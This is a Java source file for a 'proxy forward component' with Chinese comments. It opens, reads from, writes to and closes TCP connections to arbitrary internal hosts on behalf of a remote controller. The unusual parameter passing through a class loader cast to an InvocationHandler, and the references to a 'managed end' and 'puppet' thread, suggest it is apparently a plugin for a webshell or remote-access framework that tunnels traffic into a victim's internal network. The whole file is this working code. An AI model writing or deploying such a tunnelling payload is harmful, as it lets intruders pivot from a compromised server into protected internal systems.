package org.leo.core.component;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/**
 * 代理转发组件
 * 在被管理端发起到目标内网服务的 TCP 连接，并提供 open/write/read/close 操作
 */
public class ProxyForwardComponent implements Runnable {

    // 操作类型常量
    private static final int OP_OPEN = 0;
    private static final int OP_WRITE = 1;
    private static final int OP_READ = 2;
    private static final int OP_CLOSE = 3;

    // 缓冲区大小
    private static final int BUFFER_SIZE = 65536;
    private static final int DEFAULT_CONNECT_TIMEOUT_MS = 10000;
    private static final int MAX_CONNECT_TIMEOUT_MS = 300000;
    private static final int MAX_CONNECTIONS = 512;
    // idle 超时（10 分钟）
    private static final long IDLE_TIMEOUT_MS = 10L * 60L * 1000L;

    private HashMap<String, Object> params;
    private HashMap<String, Object> results;
    private static Map connMap = new ConcurrentHashMap();
    // connId -> lastActivityMillis
    private static Map connLastActivity = new ConcurrentHashMap();
   

    @Override

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


 
    public void invoke() throws IOException, NoSuchFieldException, IllegalAccessException {
        sweepIdleConns();
        Object opObj = params.get("op");
        if (!(opObj instanceof Number)) {
            results.put("code", 400);
            results.put("msg", "op must be a number");
            return;
        }
        int op = ((Number) opObj).intValue();
        Object connIdObj = params.get("connId");
        if (!(connIdObj instanceof String) || ((String) connIdObj).length() == 0) {
            results.put("code", 400);
            results.put("msg", "connId required");
            return;
        }
        String connId = (String) connIdObj;
        
        if (op == OP_OPEN) {
            handleOpen(connId);
            return;
        }
        SocketChannel socketChannel = (SocketChannel) connMap.get(connId);
        if (socketChannel == null) {
            results.put("code", 404);
            results.put("msg", "connection not found");
            return;
        }

        if (op == OP_WRITE) {
            handleWrite(socketChannel, connId);
        } else if (op == OP_READ) {
            handleRead(socketChannel, connId);
        } else if (op == OP_CLOSE) {
            handleClose(socketChannel, connId);
        } else {
            results.put("code", 400);
            results.put("msg", "unknown op: " + op);
        }
    }

    /**
     * 处理打开连接操作
     */
    private void handleOpen(String connId)  {
        Object targetHostObj = params.get("targetHost");
        Object portObj = params.get("targetPort");
        if (!(targetHostObj instanceof String) || ((String) targetHostObj).length() == 0
                || !(portObj instanceof Number)) {
            results.put("code", 400);
            results.put("msg", "targetHost and targetPort required");
            return;
        }
        String targetHost = (String) targetHostObj;
        int targetPort = ((Number) portObj).intValue();
        if (targetPort < 1 || targetPort > 65535) {
            results.put("code", 400);
            results.put("msg", "targetPort out of range");
            return;
        }
        if (connMap.containsKey(connId)) {
            results.put("code", 409);
            results.put("msg", "connId already exists");
            return;
        }
        int timeout = DEFAULT_CONNECT_TIMEOUT_MS;
        Object timeoutObj = params.get("connectTimeout");
        if (timeoutObj instanceof Number) timeout = ((Number) timeoutObj).intValue();
        if (timeout <= 0) timeout = DEFAULT_CONNECT_TIMEOUT_MS;
        if (timeout > MAX_CONNECT_TIMEOUT_MS) timeout = MAX_CONNECT_TIMEOUT_MS;
        SocketChannel socketChannel = null;
        try {
            socketChannel = SocketChannel.open();
            socketChannel.socket().connect(new InetSocketAddress(targetHost, targetPort), timeout);
            socketChannel.configureBlocking(false);
            int registration = registerConnection(connId, socketChannel);
            if (registration != 0) {
                socketChannel.close();
                results.put("code", registration == 2 ? 429 : 409);
                results.put("msg", registration == 2 ? "connection limit reached" : "connId already exists");
                return;
            }
            results.put("code", 200);
            results.put("msg", "opened");
        } catch (IOException e) {
            if (socketChannel != null) {
                try { socketChannel.close(); } catch (IOException ignored) {}
            }
            results.put("code", 404);
            results.put("msg", "建立连接失败: " + e.getMessage());
        }
    }

    /**
     * 处理写入数据操作。
     * 非阻塞 channel 单次 write 可能写不完，必须循环；
     * 加总超时保护，防止对端慢/卡死时占用 puppet 请求处理线程。
     */
    private void handleWrite(SocketChannel socketChannel, String connId) throws IOException {
        Object dataObj = params.get("data");
        if (dataObj != null && !(dataObj instanceof byte[])) {
            results.put("code", 400);
            results.put("msg", "data must be bytes");
            return;
        }
        byte[] data = dataObj == null ? new byte[0] : (byte[]) dataObj;
        ByteBuffer buf = ByteBuffer.wrap(data);
        long deadline = System.currentTimeMillis() + 5000L;
        int written = 0;
        int backoffMillis = 2;
        while (buf.hasRemaining()) {
            int n;
            try {
                n = socketChannel.write(buf);
            } catch (IOException error) {
                closeConnection(connId, socketChannel);
                throw error;
            }
            if (n > 0) {
                written += n;
                touchConnection(connId, socketChannel);
                backoffMillis = 2;
                continue;
            }
            if (System.currentTimeMillis() > deadline) {
                closeConnection(connId, socketChannel);
                results.put("code", 500);
                results.put("msg", "write timeout");
                results.put("bytesWritten", written);
                return;
            }
            try { Thread.sleep(backoffMillis); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
            if (backoffMillis < 32) backoffMillis *= 2;
            if (Thread.currentThread().isInterrupted()) {
                closeConnection(connId, socketChannel);
                results.put("code", 500);
                results.put("msg", "write interrupted");
                results.put("bytesWritten", written);
                return;
            }
        }
        results.put("code", 200);
        results.put("bytesWritten", written);
    }

    /**
     * 处理读取数据操作
     */
    private void handleRead(SocketChannel socketChannel, String connId) throws IOException {
        ByteBuffer buf = ByteBuffer.allocate(BUFFER_SIZE);
        int len;
        try {
            len = socketChannel.read(buf);
        } catch (IOException error) {
            closeConnection(connId, socketChannel);
            throw error;
        }
        if (len > 0) {
            buf.flip();
            byte[] data = new byte[buf.remaining()];
            buf.get(data);
            touchConnection(connId, socketChannel);
            results.put("code", 200);
            results.put("bytesRead", data.length);
            results.put("data", data);
        } else if (len == 0) {
            // 非阻塞模式下没有数据
            results.put("code", 204);
            results.put("bytesRead", 0);
            results.put("data", new byte[0]);
        } else if (len == -1) {
            // 对端关闭
            closeConnection(connId, socketChannel);
            results.put("code", 404);
        }
    }

    /**
     * 处理关闭连接操作
     */
    private void handleClose(SocketChannel socketChannel, String connId) throws IOException {
        closeConnection(connId, socketChannel);
        results.put("code", 200);
    }

    /** 0=success, 1=duplicate, 2=capacity reached. */
    private static int registerConnection(String connId, SocketChannel socketChannel) {
        synchronized (connMap) {
            if (connMap.containsKey(connId)) return 1;
            if (connMap.size() >= MAX_CONNECTIONS) return 2;
            connMap.put(connId, socketChannel);
            connLastActivity.put(connId, Long.valueOf(System.currentTimeMillis()));
            return 0;
        }
    }

    private static void touchConnection(String connId, SocketChannel socketChannel) {
        synchronized (connMap) {
            if (connMap.get(connId) == socketChannel) {
                connLastActivity.put(connId, Long.valueOf(System.currentTimeMillis()));
            }
        }
    }

    private static void closeConnection(String connId, SocketChannel socketChannel) {
        synchronized (connMap) {
            if (connMap.get(connId) == socketChannel) {
                connLastActivity.remove(connId);
                connMap.remove(connId);
            }
        }
        if (socketChannel != null) {
            try { socketChannel.close(); } catch (IOException ignored) {}
        }
    }

    /**
     * 清理超过 IDLE_TIMEOUT_MS 无活动的连接，在 OPEN 时触发。
     */
    private static void sweepIdleConns() {
        long now = System.currentTimeMillis();
        java.util.Iterator it = connLastActivity.entrySet().iterator();
        while (it.hasNext()) {
            java.util.Map.Entry e = (java.util.Map.Entry) it.next();
            long last = ((Long) e.getValue()).longValue();
            if (now - last > IDLE_TIMEOUT_MS) {
                String connId = (String) e.getKey();
                SocketChannel sc = (SocketChannel) connMap.get(connId);
                closeConnection(connId, sc);
            }
        }
    }
}
